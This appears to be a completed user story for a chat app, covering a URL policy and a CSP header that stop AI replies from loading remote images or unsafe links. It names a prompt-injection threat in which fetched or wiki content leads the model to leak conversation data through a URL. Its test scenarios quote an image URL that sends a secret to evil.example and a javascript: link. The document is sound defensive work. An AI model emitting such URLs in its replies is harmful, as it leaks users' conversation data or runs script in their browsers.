# E2-US07: Markdown URL hardening in chat replies

**User Story**: As the owner, I want model replies to be unable to load remote images or use unsafe links, so that a prompt injection in fetched or wiki content can't leak conversation data through a URL.

**Acceptance Criteria**:
- [x] Assistant markdown goes through one URL policy, `safeMarkdownUrl` in `apps/web/lib/safe-markdown-url.ts`, passed to Streamdown as `urlTransform`
- [x] Image sources may only be same-origin paths. Remote, protocol-relative, and `data:` images are dropped
- [x] Links may only be `https:`, `http:`, `mailto:`, same-origin paths, or `#anchors`. Any other protocol (for example `javascript:` or `data:`) is dropped
- [x] Streamdown's default `linkSafety` stays on, so opening a link asks first
- [x] A `Content-Security-Policy: img-src` header in `apps/web/next.config.ts` backs this up for every image path, including attachment parts that bypass markdown
- [x] The vendored `components/ai-elements` stay untouched: the props are passed from `app/_components/agent-message.tsx`
- [x] Unit tests cover every rule at 100% coverage

**Technical Tasks**:
| Layer | Task | File(s) |
|-------|------|---------|
| Web | URL policy | `apps/web/lib/safe-markdown-url.ts` |
| Web | Wire into replies | `apps/web/app/_components/agent-message.tsx` |
| Web | CSP image backstop | `apps/web/next.config.ts` |
| Tooling | Web Vitest project | `vitest.config.ts` |

**Dependencies**: E2-US03

**Complexity**: S

**Status**: Done

**Test Scenarios**:
```gherkin
Scenario: Remote image in a reply
  Given a reply containing ![x](https://evil.example/p.png?d=secret)
  Then no request is made to evil.example

Scenario: javascript: link in a reply
  Given a reply containing [click](javascript:alert(1))
  Then the link has no href
```
